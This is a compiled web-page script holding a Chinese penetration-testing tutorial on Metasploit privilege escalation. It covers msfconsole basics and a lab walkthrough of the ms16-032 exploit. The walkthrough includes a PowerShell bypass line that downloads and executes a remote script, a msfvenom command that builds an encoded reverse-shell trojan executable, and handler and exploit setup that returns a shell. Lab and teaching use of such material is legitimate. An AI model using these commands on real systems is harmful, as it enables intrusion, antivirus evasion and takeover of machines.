"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[1341],{3254:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>d,contentTitle:()=>r,default:()=>h,frontMatter:()=>c,metadata:()=>i,toc:()=>o});const i=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/MSF\u63d0\u6743","title":"MSF\u63d0\u6743","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/04.\u5185\u7f51\u6e17\u900f/01.MSF\u63d0\u6743.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/04.\u5185\u7f51\u6e17\u900f","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/MSF\u63d0\u6743","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/MSF\u63d0\u6743","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/04.\u5185\u7f51\u6e17\u900f/01.MSF\u63d0\u6743.md","tags":[],"version":"current","sidebarPosition":1,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"oss-put","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5de5\u5177\u4f7f\u7528/oss-put"},"next":{"title":"\u5185\u7f51\u6e17\u900f","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/kubernetes/"}}');var l=s(4848),t=s(8453);const c={},r=void 0,d={},o=[{value:"1.msfconsole \u57fa\u672c\u4f7f\u7528\u547d\u4ee4",id:"1msfconsole-\u57fa\u672c\u4f7f\u7528\u547d\u4ee4",level:2},{value:"2.\u6a21\u5757",id:"2\u6a21\u5757",level:2},{value:"exploit",id:"exploit",level:3},{value:"payload",id:"payload",level:3},{value:"auxiliary",id:"auxiliary",level:3},{value:"encode",id:"encode",level:3},{value:"3.\u5b9e\u6218 ms16-032\u63d0\u6743",id:"3\u5b9e\u6218-ms16-032\u63d0\u6743",level:2},{value:"1.\u67e5\u770b\u5f53\u524d\u6743\u9650\u3001\u7248\u672c\u3001ip\u7b49\uff0c\u53d1\u73b0\u662f\u4e00\u4e2awin7\u4e13\u4e1a\u6743\u9650\u5f88\u4f4e\u7684\u7528\u6237",id:"1\u67e5\u770b\u5f53\u524d\u6743\u9650\u7248\u672cip\u7b49\u53d1\u73b0\u662f\u4e00\u4e2awin7\u4e13\u4e1a\u6743\u9650\u5f88\u4f4e\u7684\u7528\u6237",level:3},{value:"2.\u8fdc\u7a0b\u52a0\u8f7dsherlock\u67e5\u770b\u5f53\u524d\u7248\u672c\u6f0f\u6d1e\u4fe1\u606f\u5e76\u5bfc\u5165\u4e00\u4e2a1.txt\u6587\u4ef6\u4e2d",id:"2\u8fdc\u7a0b\u52a0\u8f7dsherlock\u67e5\u770b\u5f53\u524d\u7248\u672c\u6f0f\u6d1e\u4fe1\u606f\u5e76\u5bfc\u5165\u4e00\u4e2a1txt\u6587\u4ef6\u4e2d",level:3},{value:"3.\u6211\u4eec\u4f7f\u7528msf\u505a\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f",id:"3\u6211\u4eec\u4f7f\u7528msf\u505a\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f",level:3}];function p(n){const e={a:"a",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,t.R)(),...n.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsxs)(e.table,{children:[(0,l.jsx)(e.thead,{children:(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,l.jsx)(e.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,l.jsx)(e.tbody,{children:(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{style:{textAlign:"left"},children:(0,l.jsx)(e.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,l.jsx)(e.td,{style:{textAlign:"left"},children:"2025-08-19 16:44:37"})]})})]}),"\n",(0,l.jsx)(e.p,{children:"msf-\u822c\u4f1a\u6709\u56db\u79cd\u63a5\u53e3\u5bf9\u5916\u63d0\u4f9b, msfconsole\u3001 msfc\u3001 msfgui\u4ee5\u53ca msfet,\u6211\u4eec\u4e3b\u8981\u4ee5 msfconsole\u6765\u505a\u8bb2\u89e3\u4e0e\u6f14\u793a\u3002"}),"\n",(0,l.jsx)(e.h2,{id:"1msfconsole-\u57fa\u672c\u4f7f\u7528\u547d\u4ee4",children:"1.msfconsole \u57fa\u672c\u4f7f\u7528\u547d\u4ee4"}),"\n",(0,l.jsx)(e.p,{children:"\u542f\u52a8\uff1a msfconsole"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644170.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:"\u4f7f\u7528\u6307\u5357\uff1ahelp"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644172.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:"\u57fa\u7840\u547d\u4ee4"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{children:"search ms17 #\u67e5\u627e\n\nuse exploit/multi/handler #\u4f7f\u7528 \n\ninfo #\u67e5\u770b\u4fe1\u606f \n\nshow exploits/payloads/options #\u663e\u793a\u53ef\u7528\u4fe1\u606f \n\nset options/payload #\u7ed9\u76f8\u5173\u5bf9\u8c61\u8d4b\u503c \n\nexploit/run #\u6267\u884c \n\nexploit #\u540e\u53f0\u8fd0\u884c \n\nback #\u8fd4\u56de\u4e0a\u4e00\u7ea7 \n\nsessions -i  #\u67e5\u770b\u5f53\u524d\u53ef\u7528\u4f1a\u8bdd \n\nsessions -K #\u6740\u6b7b\u6240\u6709\u6d3b\u8dc3\u4f1a\u8bdd\n"})}),"\n",(0,l.jsx)(e.h2,{id:"2\u6a21\u5757",children:"2.\u6a21\u5757"}),"\n",(0,l.jsx)(e.h3,{id:"exploit",children:"exploit"}),"\n",(0,l.jsx)(e.p,{children:"\u5229\u7528\u7a0b\u5e8f,\u9488\u5bf9\u6f0f\u6d1e\u3001\u6743\u9650\u8fdb\u884c\u5229\u7528,\u662f\u4e3b\u8981\u4f7f\u7528\u7684\u6a21\u5757"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644173.png",alt:"img"})}),"\n",(0,l.jsx)(e.h3,{id:"payload",children:"payload"}),"\n",(0,l.jsx)(e.p,{children:"\u7528\u4e8e\u5728\u76ee\u6807\u7cfb\u7edf\u4e2d\u8fd0\u884c\u4efb\u610f\u547d\u4ee4\u6216\u8005\u6267\u884c\u7279\u5b9a\u4ee3\u7801,\u4e3b\u8981\u7528\u4e8eshell\u83b7\u53d6"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644174.png",alt:"img"})}),"\n",(0,l.jsx)(e.h3,{id:"auxiliary",children:"auxiliary"}),"\n",(0,l.jsx)(e.p,{children:"\u8be5\u6a21\u5757\u5305\u542b\u4e86\u626b\u63cf\u3001\u55c5\u63a2\u3001\u6307\u7eb9\u8bc6\u522b\u3001\u7f51\u7edc\u534f\u8bae\u6b3a\u9a97\u7b49\u76f8\u5173\u529f\u80fd\u6a21\u5757"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644175.png",alt:"img"})}),"\n",(0,l.jsx)(e.h3,{id:"encode",children:"encode"}),"\n",(0,l.jsx)(e.p,{children:"r\u8be5\u6a21\u5757\u4e3b\u8981\u9488\u5bf9 exploit\u6a21\u5757\u8fdb\u884c\u4ee3\u7801\u514d\u6740,\u4ee5\u9003\u8fc7\u6740\u6bd2\u8f6f\u4ef6\u3001\u9632\u706b\u5899\u3001ids\u7b49\u5b89\u5168\u9632\u62a4\u673a\u5236\u7684\u68c0\u6d4b"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644176.png",alt:"img"})}),"\n",(0,l.jsx)(e.h2,{id:"3\u5b9e\u6218-ms16-032\u63d0\u6743",children:"3.\u5b9e\u6218 ms16-032\u63d0\u6743"}),"\n",(0,l.jsx)(e.h3,{id:"1\u67e5\u770b\u5f53\u524d\u6743\u9650\u7248\u672cip\u7b49\u53d1\u73b0\u662f\u4e00\u4e2awin7\u4e13\u4e1a\u6743\u9650\u5f88\u4f4e\u7684\u7528\u6237",children:"1.\u67e5\u770b\u5f53\u524d\u6743\u9650\u3001\u7248\u672c\u3001ip\u7b49\uff0c\u53d1\u73b0\u662f\u4e00\u4e2awin7\u4e13\u4e1a\u6743\u9650\u5f88\u4f4e\u7684\u7528\u6237"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644177.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644178.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644179.png",alt:"img"})}),"\n",(0,l.jsx)(e.h3,{id:"2\u8fdc\u7a0b\u52a0\u8f7dsherlock\u67e5\u770b\u5f53\u524d\u7248\u672c\u6f0f\u6d1e\u4fe1\u606f\u5e76\u5bfc\u5165\u4e00\u4e2a1txt\u6587\u4ef6\u4e2d",children:"2.\u8fdc\u7a0b\u52a0\u8f7dsherlock\u67e5\u770b\u5f53\u524d\u7248\u672c\u6f0f\u6d1e\u4fe1\u606f\u5e76\u5bfc\u5165\u4e00\u4e2a1.txt\u6587\u4ef6\u4e2d"}),"\n",(0,l.jsxs)(e.p,{children:["powershell -nop -exec -bypass -c \"IEX (New-Object Net.Webclient).DownloadString('",(0,l.jsx)(e.a,{href:"http://192.168.10.100/Sherlock.ps1",children:"http://192.168.10.100/Sherlock.ps1"}),"'); Find-Allvulns\" >1.txt"]}),"\n",(0,l.jsx)(e.p,{children:'powershell -nop -exec -bypass -c "Import-Module Sherlock.ps1; Find-Allvulns" >1.txt'}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644180.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:"\u6267\u884c\u5b8c\u6210\u5e76\u8fd4\u56de\u4e00\u4e2a1.txt\uff0c\u67e5\u770b\u6f0f\u6d1e\u4fe1\u606f"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644181.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:"\u53d1\u73b0\u7248\u672c\u662f64\u4f4d\u7684\u6682\u4e0d\u652f\u6301\u6f0f\u6d1e"}),"\n",(0,l.jsx)(e.h3,{id:"3\u6211\u4eec\u4f7f\u7528msf\u505a\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f",children:"3.\u6211\u4eec\u4f7f\u7528msf\u505a\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f"}),"\n",(0,l.jsx)(e.p,{children:"msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\\x00' LHOST=192.168.119.130 LPORT=4444 -f exe > 1.exe"}),"\n",(0,l.jsx)(e.p,{children:"\u53c2\u6570\u8bf4\u660e\uff1a"}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsx)(e.li,{children:"-p payload"}),"\n",(0,l.jsx)(e.li,{children:"-e \u7f16\u7801\u65b9\u5f0f"}),"\n",(0,l.jsx)(e.li,{children:"-i \u7f16\u7801\u6b21\u6570"}),"\n",(0,l.jsx)(e.li,{children:"-b \u5728\u751f\u6210\u7684\u7a0b\u5e8f\u4e2d\u907f\u514d\u51fa\u73b0\u7684\u503c"}),"\n",(0,l.jsx)(e.li,{children:"LHOST,LPORT \u76d1\u542c\u4e0a\u7ebf\u7684\u4e3b\u673aIP\u548c\u7aef\u53e3"}),"\n",(0,l.jsx)(e.li,{children:"-f exe \u751f\u6210EXE\u683c\u5f0f"}),"\n"]}),"\n",(0,l.jsx)(e.p,{children:"\u8bbe\u7f6e\u672c\u5730\u76d1\u542c"}),"\n",(0,l.jsx)(e.p,{children:"msf6 > use exploit/multi/handler"}),"\n",(0,l.jsx)(e.p,{children:"msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644182.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:"\u4e0a\u4f20\u4e4b\u9776\u673aweb \u8fd0\u884c \u8fd9\u91cc\u6211\u4eec ip \u7aef\u53e34443 \u8bbe\u7f6e\u9519\u4e86 \u91cd\u65b0\u6539\u4e00\u4e0b 192.168.119.130:4443"}),"\n",(0,l.jsx)(e.p,{children:"\u524d\u9762\u7684 exe\u6587\u4ef6\u4e5f\u8981\u91cd\u65b0\u751f\u6210"}),"\n",(0,l.jsx)(e.p,{children:"\u6267\u884c"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644183.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:"\u67e5\u770b\u4e00\u4e0b\u6743\u9650 \u6ca1\u95ee\u9898\u7248\u672c\u6743\u9650\u5f88\u4f4e"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644184.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:"\u8fd8\u662f\u4f7f\u7528sherlock  \u67e5\u770b \u6f0f\u6d1e"}),"\n",(0,l.jsx)(e.p,{children:'powershell -exec -bypass -c "sherlock.ps1; Find-Allvulns" >2.txt'}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644185.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644186.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:"\u9009\u62e9\u4e00\u4e2a\u5f53\u524d\u7248\u672c\u7684\u6f0f\u6d1e\u4f7f\u7528"}),"\n",(0,l.jsx)(e.p,{children:"\u8fd9\u91cc\u6f14\u793aMS16_032\u7684\u6f0f\u6d1e"}),"\n",(0,l.jsx)(e.p,{children:"use exploit/windows/local/ms16_032_secondary_logon_handle_privesc"}),"\n",(0,l.jsx)(e.p,{children:"\u8bbe\u7f6epayload session LHOST LPORT"}),"\n",(0,l.jsx)(e.p,{children:"msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set payload windows/meterpreter/reverse_tcp"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644187.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644188.png",alt:"img"})}),"\n",(0,l.jsx)(e.p,{children:"\u8fd0\u884c\u5373\u53ef\u83b7\u5f97shell"}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191644189.png",alt:"img"})})]})}function h(n={}){const{wrapper:e}={...(0,t.R)(),...n.components};return e?(0,l.jsx)(e,{...n,children:(0,l.jsx)(p,{...n})}):p(n)}},8453:(n,e,s)=>{s.d(e,{R:()=>c,x:()=>r});var i=s(6540);const l={},t=i.createContext(l);function c(n){const e=i.useContext(t);return i.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function r(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(l):n.components||l:c(n.components),i.createElement(t.Provider,{value:e},n.children)}}}]);